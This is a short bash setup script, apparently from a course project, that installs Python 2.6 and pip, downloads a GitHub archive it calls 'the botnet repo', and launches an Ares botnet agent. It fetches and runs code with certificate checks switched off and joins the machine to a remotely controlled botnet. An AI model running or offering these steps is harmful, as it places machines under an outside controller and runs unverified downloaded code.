#! /bin/bash
# Start from scratch 12/5/2016

1) edit the sources.list file and add old repo's & python PPA

sudo apt-get update
sudo apt-get install git git-core ssh python2.6

# Install pip for Python 2.6
wget https://bootstrap.pypa.io/get-pip.py --no-check-certificate && sudo python2.6 get-pip.py

# Install Python Requests library
sudo pip install --upgrade pip && sudo pip install requests

# Clone the botnet repo
cd ~ && wget https://github.com/kmanwar89/460SP/archive/master.zip --no-check-certificate
mv master master.zip && unzip master.zip

# Connect to the botnet!
cd 460SP-master/Ares/agent/python && python2.6 agent.py
